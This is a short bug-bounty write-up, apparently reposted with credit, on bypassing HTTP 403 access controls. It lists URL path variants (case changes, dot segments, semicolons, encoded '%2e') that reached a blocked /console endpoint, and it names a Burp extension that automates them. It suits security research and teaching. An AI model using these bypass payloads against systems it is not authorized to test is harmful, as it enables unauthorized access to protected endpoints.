# ***Bypassing 403s like a PRO! ($2,100)***

*1. As usual, I begin my directory enumeration with the dirbuster wordlists and find a /console endpoint which returns a 403 response.*
*2. Ways to bypass 403 endpoints (If /path is blocked)*
```
/path –> HTTP 403 Forbidden
/PATH –> HTTP 200 OK
/path/ –> HTTP 200 OK
/path/. –> HTTP 200 OK
//path// –> HTTP 200 OK
/./path/.. –> HTTP 200 OK
/;/path –> HTTP 200 OK
/.;/path –> HTTP 200 OK
//;//path –> HTTP 200 OK
/path.json –> HTTP 200 OK
```
*3. I prefer using the 403 Bypasser Burp extension by Gil Nothmann to automate the bypass techniques.*
*4. What worked for me? Usage of a dot or %2e in the URL path:  `/%2e/console`*
## *The submission was triaged quickly and categorized as a P1. I was later rewarded with a $2,100 bounty.*<br>
<br>&nbsp;

----
## ***Credit***
Based on [Shrirang Diwakar](https://shrirangdiwakar.medium.com/bypassing-403s-like-a-pro-2-100-broken-access-control-66beef4afa8c)'s writeup.

----
## ***Support***
You can Follow [me](https://www.linkedin.com/in/bhavesh-pardhi-/) on LinkedIn or
<br><br>[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://www.buymeacoffee.com/bhaveshpardhi)
